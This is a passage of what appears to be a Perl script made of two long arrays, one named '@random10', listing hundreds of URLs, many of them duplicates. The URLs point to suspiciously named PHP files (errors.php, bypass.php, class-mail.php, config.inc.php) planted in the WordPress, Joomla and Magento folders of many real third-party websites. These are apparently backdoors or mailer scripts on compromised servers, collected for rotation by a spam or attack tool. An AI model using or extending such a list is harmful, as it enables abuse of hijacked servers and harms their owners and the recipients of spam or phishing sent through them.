"http://virtual-aerospace.co.jp//errors.php",
"http://mrsteamers.com//wp-content/plugins/errors.php",
"http://onlineordering.alumaxshowerdoor.com/skin/frontend/errors.php",
"http://www.chispazorumbas.com//plugins/errors.php",
"http://projects.kurinjiemedia.com/singlemovie//wp-content/plugins/errors.php",
"http://pasionporlajusticia.com/2015//wp-content/plugins/errors.php",
"http://www.younik.co/skin/frontend/errors.php",
"http://www.fedir.it//components/com_mailto/views/mailto/errors.php",
"http://www.copati.org.br//images/jdownloads/screenshots/thumbnails/errors.php",
"http://tuva-church.com/slovo//wp-content/plugins/dzs-videogallery/errors.php",
"http://morada.com.ve/newsite//wp-content/plugins/dzs-videogallery/errors.php",
"http://cmtactical.com//skin/install/default/default/errors.php",
"http://oldfashionedman.com//errors.php",
"http://ajansfestival.com/wp-admin/user/error.php",
"http://box-creative.com/bx//wp-includes/js/swfupload//error.php",
"http://tricotrico.com/wp-includes/error.php",
"http://www.shg-vaskulitis-eifel-mosel.de//forum/style/portal/error.php",
"http://nutritie-wellness.ro/var/package/tmp/error.php",
"http://pngk.kz/media/media/css/index.php",
"http://www.3freebids.com/error.php",
"http://www.rateavon.je/error.php",
"http://dateakademie.de/wp-includes/error.php",
"http://themansphere.com/wp-includes/error.php",
"https://www.cloudipalarm.nl/wp-content/plugins/revslider/temp/errors.php",
"http://directproducts.co.zw/errors.php",
"http://www.acdt-manutention.fr/errors.php",
"http://www.semneartemis.ro/images/errors.php",
"http://hi.ctust.edu.tw/medicalcontest//components/com_mailto/error.php",
"http://www.lupetticonsultoria.com.br//kellylupetti/errors.php",
"http://redzee.com.au/friends/errors.php",
"http://watchmanreports.com/errors.php",
"http://www.chispazorumbas.com//hwdvideos/errors.php",
"http://islamone.org/errors.php",
"http://hoopsnhiphop.com/errors.php",
"http://www.brasilecon.net/skin/errors.php",
"http://redzee.com.au/friends/inc/classes/errors.php",
"http://shoppershopee.com/errors.php",
"http://xoxofimp.com//errors.php",
"http://islamone.org/flash/errors.php",
"http://www.lmcreativedesign.com.br/wp-content/plugins/errors.php",
"http://heb.smart-test.co.il/errors.php",
"http://www.petropolis.rj.gov.br/intranet/components/com_mailto/error.php",
"http://www.yplittleport.org.uk/media/system/config.index.php",
"http://www.thermona-ekb.ru/errors.php",
"http://clinicavanity.com.br/2012/wp-includes/error.php",
"http://w2.portais.atrio.scire.net.br/upe-ppte/components/com_mailto/error.php",
"http://australiansuperaudit.com.au/errors.php",
"http://www.ares-asesores.com/ares/wp-content/languages/error.php",
"http://vatnedekkservice.no/wp-includes/js/thickbox/class-mail.php",
"http://www.jhanjhatfree.com//skin/frontend/base/errors.php",
"http://kontento.eu/wp-content/themes/smartbox-theme/error.php",
"http://valentealexvalente.com/alex/wp-includes/error.php",
"http://therfw.com/wp-includes/error.php",
"http://representacoesdasa.com.br/wp-admin/errors.php",
"http://greenpowerguy.com/blog/wp-content/themes/error.php",
"http://www.gardenmachinery.ie/errors.php",
"http://www.telsonet.pl/errors.php",
"http://www.alvestaguesthouse.co.za/wp-content/themes/welcome_inn/cache/pro.php",
"http://pastorbonus.sk/errors.php",
"http://rothwellscouts.com/media/mailto/error.php",
"http://www.pebk.de/joomla/components/com_mailto/error.php",
"http://www.gambinigroup.it/media/mailto/error.php",
"http://www.imakecollege.com:37001//plugins/editors/errors.php",
"http://imotionasia.com.vn/errors.php",
"http://www.theatresprives.com/errors.php",
"http://www.pece.com.my/2014/wp-content/themes/Avada/framework/error.php",
"http://moreketing.mx/errors.php",
"http://cccjamaica.org/cccj_main/media/mailto/error.php",
"http://www.psdf.org.pk/errors.php",
"http://www.asesoriaentesis.com/components/com_mailto/error.php",
"http://www.modelismonaval.com/components/com_user/class-mail.php",
"http://www.sbagro.org.br/modules/mod_login/error.php",
"http://p.istu.ru//components/com_mailto/error.php",
"http://circuitec.com.br/errors.php",
"http://www.bendit.co/backside/media/mailto/error.php",
"http://www.musetti.eu/errors.php",
"http://www.bespoke-valeting.co.uk/wp-includes/error.php",
"http://bohealth.eu/media/com_jantivirus/css/index.php",
"http://www.thewigmall.com/errors.php",
"https://www.aavamobile.com/modules/mod_search/index.php",
"http://virtual-aerospace.co.jp/errors.php",
"http://www.studiogross.com.br/web/wp-includes/error.php",
"http://www.fcors.com.br/modules/mod_banners/error.php",
"http://www.cocofashion.com.au/errors.php",
"http://www.tkofschip.be/joomlasites/ankerintranet5/plugins/content/config.index.php",
"http://www.austriasport.nl/wp-includes/errors.php",
"http://www.cannell-immobilier.com/errors.php",
"http://savvyschools.ie/wp-includes/images/pass/script-loader.php",
"http://sufbellman.dk//errors.php",
"http://printfastt.com.br/errors.php",
"http://metroway.com/wp-includes/ID3/proxy.php",
"http://www.kawaiishop.fr/var/pass/search.php",
"http://jhealthy.com/jhome//wp-admin/error.php",
"http://turkishonline.ru//media/system/js/error.php",
"http://www.photodesign.uncanny.cz/images/error.php",
"http://chaoscollective.in/administrator/components/com_weblinks/views/errors.php",
"http://www.bortolotto.eu/plugins/editors/error.php",
"http://www.cchm.ca/components/com_mailto/error.php",
"http://www.jaguarcarclubofwa.com.au/jaguarcarclubofwa/images/error.php",
"http://bioenfapesp.org/media/mailto/error.php",
"http://blizzsozz.com/errors.php",
"http://celticdesire.com//components/com_admintools.backup.8125814a31f9f71dc788a351c9ffb5d8/class-mail.php",
"http://www.mirabalcenter.org//errors.php",
"http://www.pessebristassumpcio.com/wp-includes/error.php",
"http://ivanous.free.fr/camu_s_world/images/stories/jump.php",
"http://www.pricepaving.com//wp-includes/js/plupload/index.php",
"http://www.corteganamedieval.com/components/com_content/views/section/tmpl/page-sidebar.php",
"http://www.zsp.karpacz.pl//libraries/joomla/document/index.php",
"http://www.shturmovoi.ru/components/com_mailto/error.php",
"http://www.studio-aid.it//libraries/joomla/database/index.php",
"http://hoponhopoff.ge//errors.php",
"http://cnsave.koray.cn/errors.php",
"http://www.masterlocksleutelkluis.nl/errors.php",
"http://ecom.wilburhuang.com/errors.php",
"http://demo.ecommerce.facto.cl/magento/1.9/skin/errors.php",
"http://zamzamsweets.in/errors.php",
"http://centralcaixas.com/mdf/errors.php",
"http://www.bazardakau.com.br/errors.php",
"http://shardha.in/errors.php",
"http://www.sapphireengagement.co.uk/errors.php",
"http://www.dvdmall.us/errors.php",
"http://sifide.gob.mx/errors.php",
"http://www.dibbs.co.za/errors.php",
"http://www.shop.mitrapai.com/skin/errors.php",
"http://www.rotarymowers.com.au/errors.php",
"http://printi.be/errors.php",
"http://dev2.etwebsolutions.com/magento/test/1901/errors.php",
"http://khhalisi.com/media/errors.php",
"http://petbox.in//media/errors.php",
"http://orcastudio.co/blog/errors.php",
"http://www.thermona-ekb.ru/errors.php",
"http://www.bendit.co/backside/media/mailto/error.php",
"http://imotionasia.com.vn/errors.php",
"http://www.austriasport.nl/wp-includes/errors.php",
"http://www.gambinigroup.it/media/mailto/error.php",
"http://therfw.com/wp-includes/error.php",
"http://greenpowerguy.com/blog/wp-content/themes/error.php",
"http://www.petropolis.rj.gov.br/intranet/components/com_mailto/error.php",
"http://www.anz.udo.edu.ve/components/com_mailto/error.php",
"http://bioenfapesp.org/media/mailto/error.php",
"http://cccjamaica.org/cccj_main/media/mailto/error.php",
"http://www.fcors.com.br/modules/mod_banners/error.php",
"http://automarket-fortuna.ru/errors.php",
"http://www.cloudipalarm.nl//wp-admin/user/error.php",
"http://box-creative.com/bx//wp-includes/js/swfupload//error.php",
"http://www.sumkimig.ru//phpthumb///error.php",
"http://belvg.info/demo/magento/framershop/skin/frontend/default/error.php",
"http://re-bel.org//bypass.php",
"http://tsat-dashboard.com/videocache/bypass.php",
"http://newtec.vn//bypass.php",
"http://friendsofradstockrailwayland.org/upload/bypass.php",
"http://139.59.69.212/bypass.php",
"http://sweetfeel.sigmacell.in/bypass.php",
"http://www.prikabylove.com/downloader/bypass.php",
"http://3dproducts.com.ec/bypass.php",
"http://techno.pk/skin/bypass.php",
"http://www.heliboss.com.mx//skin/bypass.php",
"http://www.chemistlanes.com/bypass.php",
"http://kenthecomicman.com/bypass.php",
"http://zend.secl.com.ua/media/bypass.php",
"http://www.vonora.net/bypass.php",
"http://www.motisa.com/bypass.php",
"http://sumaho-print.net//bypass.php",
"https://gpscsomagok.hu/skin/bypass.php",
"http://laptopcity.co.nz/bypass.php",
"http://hoponhopoff.ge//errors.php",
"http://www.mirabalcenter.org//errors.php",
"http://virtual-aerospace.co.jp//errors.php",
"http://www.flowershop-neo.com/wp-includes/error.php",
"http://www.austriasport.nl/wp-includes/errors.php",
"http://celticdesire.com//components/com_admintools.backup.8125814a31f9f71dc788a351c9ffb5d8/class-mail.php",
"http://ivanous.free.fr/camu_s_world/images/stories/jump.php",
"http://www.pessebristassumpcio.com/wp-includes/error.php",
"http://www.kittfoundation.org//wp-includes/js/plupload/index.php",
"http://www.pricepaving.com//wp-includes/js/plupload/index.php",
"http://www.travelpointer.ro//wp-includes/js/plupload/index.php",
"http://www.zsp.karpacz.pl//libraries/joomla/document/index.php",
"http://www.studio-aid.it//libraries/joomla/database/index.php",
"http://www.corteganamedieval.com/components/com_content/views/section/tmpl/page-sidebar.php",
"http://www.pebk.de/joomla/components/com_mailto/error.php",
"http://www.gambinigroup.it/media/mailto/error.php",
"http://imotionasia.com.vn/errors.php",
"http://www.orfej.si/components/com_mailto/error.php",
"http://mozaika-mira.ru//media/system/js/error.php",
"http://w2.portais.atrio.scire.net.br/upe-ppte/components/com_mailto/error.php",
"http://www.petropolis.rj.gov.br/intranet/components/com_mailto/error.php",
"http://www.dileeponline.com/errors.php",
"http://www.atopsuccess.com//plugins/editors/error.php",
"http://hi.ctust.edu.tw/medicalcontest//components/com_mailto/error.php",
"http://p.istu.ru//components/com_mailto/error.php",
"http://www.telsonet.pl/errors.php",
"http://turkishonline.ru//media/system/js/error.php",
"http://vdfs.ru//plugins/editors/error.php",
"http://www.iestpjasdc.edu.pe/contabilidad/components/com_mailto/error.php",
"http://www.cchm.ca/components/com_mailto/error.php",
"http://www.ele-eme.com.mx/error.php",
"http://virtualmacompetition.com//error.php",
"http://www.fcors.com.br/modules/mod_banners/error.php",
"http://www.bortolotto.eu/plugins/editors/error.php",
"http://www.bendit.co/backside/media/mailto/error.php",
"http://www.photodesign.uncanny.cz/images/error.php",
"http://chaoscollective.in/administrator/components/com_weblinks/views/errors.php",
"http://valentealexvalente.com/alex/wp-includes/error.php",
"http://greenpowerguy.com/blog/wp-content/themes/error.php",
"http://www.sbagro.org.br/modules/mod_login/error.php",
"http://deangelisviaggi.it//wp-admin/network/error.php",
"http://www.elado.ro//xmlrpc/error.php",
"http://www.oem-dealer-parts.ca//components/com_media/error.php",
"http://blog.eurostargym.com/wp-includes/js/thickbox/class-mail.php",
"http://shop.stroiportal.kz/cgi-bin/error.php",
"http://www.mecanica.ufrj.br/ufrj-em//components/error.php",
"http://www.t1site.com.br/wp-admin/error.php",
"http://quadrabrain.com//wp-admin/error.php",
"http://milesnation.com/whitney/css/error.php",
"http://therfw.com/wp-includes/error.php",
"http://www.gardenmachinery.ie/errors.php",
"http://www.thermona-ekb.ru/errors.php",
"http://rothwellscouts.com/media/mailto/error.php",
"http://www.ehbo-eelde.nl/media/error.php",
"http://www.cocofashion.com.au/errors.php",
"http://www.alexgretter.com/google.php",
"http://www.alvestaguesthouse.co.za/wp-content/themes/welcome_inn/cache/pro.php",
"http://www.modelismonaval.com/components/com_user/class-mail.php",
"http://www.thewigmall.com/errors.php",
"http://www.solucionesparati.net/CMS2008/images/error.php",
"http://www.allcam.org/errors.php",
"http://totalfish.hu/errors.php",
"http://circuitec.com.br/errors.php",
"http://www.theatresprives.com/errors.php",
"http://wesotech.com/contact/google.php",
"http://moreketing.mx/errors.php",
"http://sufbellman.dk/media/error.php",
"http://www.mariobabiera.com/google.php",
"http://jhealthy.com/jhome//wp-admin/error.php",
"http://virtual-aerospace.co.jp/errors.php",
"http://www.studiogross.com.br/web/wp-includes/error.php",
"http://pastorbonus.sk/errors.php",
"http://test.stramed.com.tr/errors.php",
"http://metroway.com/wp-includes/ID3/proxy.php",
"http://www.psdf.org.pk/errors.php",
"http://iheld.com/errors.php",
"http://bohealth.eu/media/com_jantivirus/css/index.php",
"http://www.musetti.eu/errors.php",
"http://pngk.kz/media/media/css/index.php",
"http://www.yplittleport.org.uk/media/system/config.index.php",
"http://www.lincos.si/components/com_banners/models/error.php",
"http://eventos.unisangil.edu.co/media/media/css/index.php",
"http://www.shturmovoi.ru/components/com_mailto/error.php",
"http://www.kawaiishop.fr/var/pass/search.php",
"http://lisarkent.com/errors.php",
"http://savvyschools.ie/wp-includes/images/pass/script-loader.php",
"http://www.bespoke-valeting.co.uk/wp-includes/error.php",
"http://www.tkofschip.be/joomlasites/ankerintranet5/plugins/content/config.index.php",
"http://blizzsozz.com/errors.php",
"http://www.conradel.com/errors.php",
"http://www.jaguarcarclubofwa.com.au/jaguarcarclubofwa/images/error.php",
"http://bioenfapesp.org/media/mailto/error.php",
"http://cccjamaica.org/cccj_main/media/mailto/error.php",
"http://www.asesoriaentesis.com/components/com_mailto/error.php",
"http://dom-sad-ogorod.ru/plugins/search/config.inc.php",
"http://kavkazinterpress.ru/plugins/content/config.inc.php",
"http://www.dom-sad-ogorod.ru/plugins/search/config.inc.php",
"http://www.pkstorages.com//plugins/content/seka.php",
"http://www.3freebids.com/error.php",
"http://www.rateavon.je/error.php",
"http://dateakademie.de/wp-includes/error.php",
"http://www.cannell-immobilier.com/errors.php",
"http://themansphere.com/wp-includes/error.php",
"http://hoponhopoff.ge/errors.php",
"http://directproducts.co.zw/errors.php",
"http://www.acdt-manutention.fr/errors.php",
"http://www.semneartemis.ro/images/errors.php",
"http://www.anz.udo.edu.ve/components/com_mailto/error.php",
"http://www.thermona-ekb.ru/errors.php", 
"http://bioenfapesp.org/media/mailto/error.php",
"http://cccjamaica.org/cccj_main/media/mailto/error.php",
"http://mozaika-mira.ru//media/system/js/error.php",
"http://www.asesoriaentesis.com/components/com_mailto/error.php",
"http://www.pebk.de/joomla/components/com_mailto/error.php",
"http://www.atopsuccess.com//plugins/editors/error.php",
"http://islamone.org/flash/errors.php",
"http://pnpdistribuidora.com.br//erros/errors.php",
"http://ancoimbra.net//media/errors.php",
"http://heb.smart-test.co.il/errors.php",
"http://www.thomastyreperu.com//plugins/errors.php",
"http://soosh-lb.com//errors.php",
"http://eshopbmw.com//skin/adminhtml/default/error.php",
"http://www.mecanica.coppe.ufrj.br/ufrj-em//components/com_media/error.php",
"http://www.iwhatswatch.com//skin/frontend/default/default/images/error.php",
"http://www.imc-egypt.org//cli/error.php",
"http://www.thermona-ekb.ru/errors.php",
"http://w2.portais.atrio.scire.net.br/upe-ppte/components/com_mailto/error.php",
"http://www.petropolis.rj.gov.br/intranet/components/com_mailto/error.php",
"http://therfw.com/wp-includes/error.php",
"http://www.yplittleport.org.uk/media/system/config.index.php",
"http://greenpowerguy.com/blog/wp-content/themes/error.php",
"http://australiansuperaudit.com.au/errors.php",
"http://www.angola-embassy.nl/errors.php",
"http://www.pece.com.my/2014/wp-content/themes/Avada/framework/error.php",
"http://www.ares-asesores.com/ares/wp-content/languages/error.php",
"http://kontento.eu/wp-content/themes/smartbox-theme/error.php",
"http://arpwegenwaterbouw.nl/wp-content/themes/smartbox-theme/error.php",
"http://vatnedekkservice.no/wp-includes/js/thickbox/class-mail.php",
"http://valentealexvalente.com/alex/wp-includes/error.php",
"http://pnpdistribuidora.com.br//errors.php",
"http://clinicavanity.com.br/2012/wp-includes/error.php",
"citizenofburma.org//plugins/content/errors.php",
"http://choir.louwanjpoujezi.org//plugins/content/errors.php",
"http://gdthuyphuong.free.fr//includes/errors.php",
"https://unique-sportstime.de/shop/skin/install/default/errors.php",
"http://cnsave.koray.cn/errors.php",
"http://www.masterlocksleutelkluis.nl/errors.php",
"http://ecom.wilburhuang.com/errors.php",
"http://demo.ecommerce.facto.cl/magento/1.9/skin/errors.php",
"http://centralcaixas.com/mdf/errors.php",
"http://www.bazardakau.com.br/errors.php",
"http://shardha.in/errors.php",
"http://www.sapphireengagement.co.uk/errors.php",
"http://sifide.gob.mx/errors.php",
"http://www.dibbs.co.za/errors.php",
"http://www.shop.mitrapai.com/skin/errors.php",
"http://dev2.etwebsolutions.com/magento/test/1901/errors.php",
"http://khhalisi.com/media/errors.php",
"http://petbox.in//media/errors.php",
"http://www.thermona-ekb.ru/errors.php",
"http://www.bendit.co/backside/media/mailto/error.php",
"http://imotionasia.com.vn/errors.php",
"http://www.austriasport.nl/wp-includes/errors.php",
"http://www.gambinigroup.it/media/mailto/error.php",
"http://therfw.com/wp-includes/error.php",
"http://greenpowerguy.com/blog/wp-content/themes/error.php",
"http://www.petropolis.rj.gov.br/intranet/components/com_mailto/error.php",
"http://bioenfapesp.org/media/mailto/error.php",
"http://cccjamaica.org/cccj_main/media/mailto/error.php",
"http://www.fcors.com.br/modules/mod_banners/error.php",
"http://automarket-fortuna.ru/errors.php",
"http://www.cloudipalarm.nl//wp-admin/user/error.php",
"http://box-creative.com/bx//wp-includes/js/swfupload//error.php",
"http://www.sumkimig.ru//phpthumb/error.php",
"http://belvg.info/demo/magento/framershop/skin/frontend/default/error.php",
"http://tsat-dashboard.com/videocache/bypass.php",
"http://newtec.vn//bypass.php",
"http://139.59.69.212/bypass.php",
"http://sweetfeel.sigmacell.in/bypass.php",
"http://www.prikabylove.com/downloader/bypass.php",
"http://3dproducts.com.ec/bypass.php",
"http://www.heliboss.com.mx//skin/bypass.php",
"http://www.chemistlanes.com/bypass.php",
"http://zend.secl.com.ua/media/bypass.php",
"http://www.vonora.net/bypass.php",
"http://www.motisa.com/bypass.php",
"https://gpscsomagok.hu/skin/bypass.php",
"http://www.studiofifteen.in/errors.php",
"http://daddivamoda.com.br/bypass.php",
"http://hoponhopoff.ge//errors.php",
"http://www.mirabalcenter.org//errors.php",
"http://virtual-aerospace.co.jp//errors.php",
"http://www.flowershop-neo.com/wp-includes/error.php",
"http://www.austriasport.nl/wp-includes/errors.php",
"http://celticdesire.com//components/com_admintools.backup.8125814a31f9f71dc788a351c9ffb5d8/class-mail.php",
"http://ivanous.free.fr/camu_s_world/images/stories/jump.php",
"http://www.pessebristassumpcio.com/wp-includes/error.php",
"http://www.pricepaving.com//wp-includes/js/plupload/index.php",
"http://www.travelpointer.ro//wp-includes/js/plupload/index.php",
"http://www.zsp.karpacz.pl//libraries/joomla/document/index.php",
"http://www.studio-aid.it//libraries/joomla/database/index.php",
"http://www.corteganamedieval.com/components/com_content/views/section/tmpl/page-sidebar.php",
"http://www.gambinigroup.it/media/mailto/error.php",
"http://imotionasia.com.vn/errors.php",
"http://www.orfej.si/components/com_mailto/error.php",
"http://mozaika-mira.ru//media/system/js/error.php",
"http://w2.portais.atrio.scire.net.br/upe-ppte/components/com_mailto/error.php",
"http://www.petropolis.rj.gov.br/intranet/components/com_mailto/error.php",
"http://www.dileeponline.com/errors.php",
"http://www.atopsuccess.com//plugins/editors/error.php",
"http://hi.ctust.edu.tw/medicalcontest//components/com_mailto/error.php",
"http://p.istu.ru//components/com_mailto/error.php",
"http://www.telsonet.pl/errors.php",
"http://turkishonline.ru//media/system/js/error.php",
"http://vdfs.ru//plugins/editors/error.php",
"http://www.cchm.ca/components/com_mailto/error.php",
"http://www.ele-eme.com.mx/error.php",
"http://virtualmacompetition.com//error.php",
"http://www.fcors.com.br/modules/mod_banners/error.php",
"http://www.bortolotto.eu/plugins/editors/error.php",
"http://www.bendit.co/backside/media/mailto/error.php",
"http://www.photodesign.uncanny.cz/images/error.php",
"http://chaoscollective.in/administrator/components/com_weblinks/views/errors.php",
"http://valentealexvalente.com/alex/wp-includes/error.php",
"http://greenpowerguy.com/blog/wp-content/themes/error.php",
"http://www.sbagro.org.br/modules/mod_login/error.php",
"http://deangelisviaggi.it//wp-admin/network/error.php",
"http://www.elado.ro//xmlrpc/error.php",
"http://www.oem-dealer-parts.ca//components/com_media/error.php",
"http://blog.eurostargym.com/wp-includes/js/thickbox/class-mail.php",
"http://quadrabrain.com//wp-admin/error.php",
"http://milesnation.com/whitney/css/error.php",
"http://therfw.com/wp-includes/error.php",
"http://www.gardenmachinery.ie/errors.php",
"http://www.thermona-ekb.ru/errors.php",
"http://rothwellscouts.com/media/mailto/error.php",
"http://www.cocofashion.com.au/errors.php",
"http://www.alexgretter.com/google.php",
"http://www.alvestaguesthouse.co.za/wp-content/themes/welcome_inn/cache/pro.php",
"http://www.modelismonaval.com/components/com_user/class-mail.php",
"http://www.thewigmall.com/errors.php",
"http://www.allcam.org/errors.php",
"http://circuitec.com.br/errors.php",
"http://www.theatresprives.com/errors.php",
"http://sufbellman.dk/media/error.php"

);

my @random10  = ("www.beslistfietsen.nl/errors.php",
"citizenofburma.org//plugins/content/errors.php",
"http://choir.louwanjpoujezi.org//plugins/content/errors.php",
"http://gdthuyphuong.free.fr//includes/errors.php",
"http://cnsave.koray.cn/errors.php",
"http://www.masterlocksleutelkluis.nl/errors.php",
"http://ecom.wilburhuang.com/errors.php",
"http://demo.ecommerce.facto.cl/magento/1.9/skin/errors.php",
"http://zamzamsweets.in/errors.php",
"http://centralcaixas.com/mdf/errors.php",
"http://www.bazardakau.com.br/errors.php",
"http://shardha.in/errors.php",
"http://www.sapphireengagement.co.uk/errors.php",
"http://www.dvdmall.us/errors.php",
"http://sifide.gob.mx/errors.php",
"http://www.dibbs.co.za/errors.php",
"http://www.shop.mitrapai.com/skin/errors.php",
"http://www.rotarymowers.com.au/errors.php",
"http://printi.be/errors.php",
"http://dev2.etwebsolutions.com/magento/test/1901/errors.php",
"http://khhalisi.com/media/errors.php",
"http://petbox.in//media/errors.php",
"http://orcastudio.co/blog/errors.php",
"http://www.thermona-ekb.ru/errors.php",
"http://www.bendit.co/backside/media/mailto/error.php",
"http://imotionasia.com.vn/errors.php",
"http://www.austriasport.nl/wp-includes/errors.php",
"http://www.gambinigroup.it/media/mailto/error.php",
"http://therfw.com/wp-includes/error.php",
"http://greenpowerguy.com/blog/wp-content/themes/error.php",
"http://www.petropolis.rj.gov.br/intranet/components/com_mailto/error.php",
"http://www.anz.udo.edu.ve/components/com_mailto/error.php",
"http://bioenfapesp.org/media/mailto/error.php",
"http://cccjamaica.org/cccj_main/media/mailto/error.php",
"http://www.fcors.com.br/modules/mod_banners/error.php",
"http://automarket-fortuna.ru/errors.php",
"http://www.cloudipalarm.nl//wp-admin/user/error.php",
"http://box-creative.com/bx//wp-includes/js/swfupload//error.php",
"http://www.sumkimig.ru//phpthumb///error.php",
"http://www.decorvega.es/bypass.php",
"http://belvg.info/demo/magento/framershop/skin/frontend/default/error.php",
"http://re-bel.org//bypass.php",
"http://tsat-dashboard.com/videocache/bypass.php",
"http://newtec.vn//bypass.php",
"http://friendsofradstockrailwayland.org/upload/bypass.php",
"http://139.59.69.212/bypass.php",
"http://sweetfeel.sigmacell.in/bypass.php",
"http://www.prikabylove.com/downloader/bypass.php",
"http://3dproducts.com.ec/bypass.php",
"http://techno.pk/skin/bypass.php",
"http://www.heliboss.com.mx//skin/bypass.php",
"http://www.chemistlanes.com/bypass.php",
"http://kenthecomicman.com/bypass.php",
"http://zend.secl.com.ua/media/bypass.php",
"http://www.vonora.net/bypass.php",
"http://www.motisa.com/bypass.php",
"http://sumaho-print.net//bypass.php",
"https://gpscsomagok.hu/skin/bypass.php",
"http://laptopcity.co.nz/bypass.php",
"http://www.studiofifteen.in/errors.php",
"http://daddivamoda.com.br/bypass.php",
"http://hoponhopoff.ge//errors.php",
"http://www.mirabalcenter.org//errors.php",
"http://virtual-aerospace.co.jp//errors.php",
"http://www.flowershop-neo.com/wp-includes/error.php",
"http://www.austriasport.nl/wp-includes/errors.php",
"http://celticdesire.com//components/com_admintools.backup.8125814a31f9f71dc788a351c9ffb5d8/class-mail.php",
"http://ivanous.free.fr/camu_s_world/images/stories/jump.php",
"http://www.pessebristassumpcio.com/wp-includes/error.php",
"http://www.kittfoundation.org//wp-includes/js/plupload/index.php",
"http://www.pricepaving.com//wp-includes/js/plupload/index.php",
"http://www.travelpointer.ro//wp-includes/js/plupload/index.php",
"http://www.zsp.karpacz.pl//libraries/joomla/document/index.php",
"http://www.studio-aid.it//libraries/joomla/database/index.php",
"http://www.corteganamedieval.com/components/com_content/views/section/tmpl/page-sidebar.php",
"http://www.pebk.de/joomla/components/com_mailto/error.php",
"http://www.gambinigroup.it/media/mailto/error.php",
"http://imotionasia.com.vn/errors.php",
"http://www.orfej.si/components/com_mailto/error.php",
"http://mozaika-mira.ru//media/system/js/error.php",
"http://w2.portais.atrio.scire.net.br/upe-ppte/components/com_mailto/error.php",
"http://www.petropolis.rj.gov.br/intranet/components/com_mailto/error.php",
"http://www.dileeponline.com/errors.php",
"http://www.atopsuccess.com//plugins/editors/error.php",
"http://hi.ctust.edu.tw/medicalcontest//components/com_mailto/error.php",
"http://p.istu.ru//components/com_mailto/error.php",
"http://www.telsonet.pl/errors.php",
"http://turkishonline.ru//media/system/js/error.php",
"http://vdfs.ru//plugins/editors/error.php",
"http://www.iestpjasdc.edu.pe/contabilidad/components/com_mailto/error.php",
"http://www.cchm.ca/components/com_mailto/error.php",
"http://www.ele-eme.com.mx/error.php",
"http://virtualmacompetition.com//error.php",
"http://www.fcors.com.br/modules/mod_banners/error.php",
"http://www.bortolotto.eu/plugins/editors/error.php",
"http://www.bendit.co/backside/media/mailto/error.php",
"http://www.photodesign.uncanny.cz/images/error.php",
"http://chaoscollective.in/administrator/components/com_weblinks/views/errors.php",
"http://valentealexvalente.com/alex/wp-includes/error.php",
"http://greenpowerguy.com/blog/wp-content/themes/error.php",
"http://www.sbagro.org.br/modules/mod_login/error.php",
"http://deangelisviaggi.it//wp-admin/network/error.php",
"http://www.elado.ro//xmlrpc/error.php",
"http://www.oem-dealer-parts.ca//components/com_media/error.php",
"http://blog.eurostargym.com/wp-includes/js/thickbox/class-mail.php",
"http://shop.stroiportal.kz/cgi-bin/error.php",
"http://www.mecanica.ufrj.br/ufrj-em//components/error.php",
"http://www.t1site.com.br/wp-admin/error.php",
"http://quadrabrain.com//wp-admin/error.php",
"http://milesnation.com/whitney/css/error.php",
"http://therfw.com/wp-includes/error.php",
"http://www.gardenmachinery.ie/errors.php",
"http://www.thermona-ekb.ru/errors.php",
"http://rothwellscouts.com/media/mailto/error.php",
"http://www.ehbo-eelde.nl/media/error.php",
"http://www.cocofashion.com.au/errors.php",
"http://www.alexgretter.com/google.php",
"http://www.alvestaguesthouse.co.za/wp-content/themes/welcome_inn/cache/pro.php",
"http://www.modelismonaval.com/components/com_user/class-mail.php",
"http://www.thewigmall.com/errors.php",
"http://www.solucionesparati.net/CMS2008/images/error.php",
"http://www.allcam.org/errors.php",
"http://totalfish.hu/errors.php",
"http://circuitec.com.br/errors.php",
"http://www.theatresprives.com/errors.php",
"http://wesotech.com/contact/google.php",
"http://moreketing.mx/errors.php",
"http://sufbellman.dk/media/error.php",
"http://www.mariobabiera.com/google.php",
"http://jhealthy.com/jhome//wp-admin/error.php",
"http://virtual-aerospace.co.jp/errors.php",
"http://www.studiogross.com.br/web/wp-includes/error.php",
"http://pastorbonus.sk/errors.php",
"http://test.stramed.com.tr/errors.php",
"http://metroway.com/wp-includes/ID3/proxy.php",
"http://www.psdf.org.pk/errors.php",
"http://iheld.com/errors.php",
"http://bohealth.eu/media/com_jantivirus/css/index.php",
"http://www.musetti.eu/errors.php",
"http://pngk.kz/media/media/css/index.php",
"http://www.yplittleport.org.uk/media/system/config.index.php",
"http://www.lincos.si/components/com_banners/models/error.php",
"http://eventos.unisangil.edu.co/media/media/css/index.php",
"http://www.shturmovoi.ru/components/com_mailto/error.php",
"http://www.kawaiishop.fr/var/pass/search.php",
"http://lisarkent.com/errors.php",
"http://savvyschools.ie/wp-includes/images/pass/script-loader.php",
"http://www.bespoke-valeting.co.uk/wp-includes/error.php",
"http://www.tkofschip.be/joomlasites/ankerintranet5/plugins/content/config.index.php",
"http://blizzsozz.com/errors.php",
"http://www.conradel.com/errors.php",
"http://www.jaguarcarclubofwa.com.au/jaguarcarclubofwa/images/error.php",
"http://bioenfapesp.org/media/mailto/error.php",
"http://cccjamaica.org/cccj_main/media/mailto/error.php",
"http://www.asesoriaentesis.com/components/com_mailto/error.php",
"http://dom-sad-ogorod.ru/plugins/search/config.inc.php",
"http://kavkazinterpress.ru/plugins/content/config.inc.php",
"http://www.dom-sad-ogorod.ru/plugins/search/config.inc.php",
"http://www.pkstorages.com//plugins/content/seka.php",
"http://www.3freebids.com/error.php",
"http://www.rateavon.je/error.php",
"http://dateakademie.de/wp-includes/error.php",
"http://www.cannell-immobilier.com/errors.php",
"http://themansphere.com/wp-includes/error.php",
"http://hoponhopoff.ge/errors.php",
"http://directproducts.co.zw/errors.php",
"http://www.acdt-manutention.fr/errors.php",
"http://www.semneartemis.ro/images/errors.php",
"http://www.anz.udo.edu.ve/components/com_mailto/error.php",
"http://www.thermona-ekb.ru/errors.php", 
"http://bioenfapesp.org/media/mailto/error.php",
"http://cccjamaica.org/cccj_main/media/mailto/error.php",
"http://mozaika-mira.ru//media/system/js/error.php",
"http://www.asesoriaentesis.com/components/com_mailto/error.php",
"http://www.pebk.de/joomla/components/com_mailto/error.php",
"http://www.atopsuccess.com//plugins/editors/error.php",
"http://islamone.org/flash/errors.php",
"http://pnpdistribuidora.com.br//erros/errors.php",
"http://ancoimbra.net//media/errors.php",
"http://heb.smart-test.co.il/errors.php",
"http://www.thomastyreperu.com//plugins/errors.php",
"http://soosh-lb.com//errors.php",
"http://eshopbmw.com//skin/adminhtml/default/error.php",
"http://www.mecanica.coppe.ufrj.br/ufrj-em//components/com_media/error.php",
"http://www.iwhatswatch.com//skin/frontend/default/default/images/error.php",
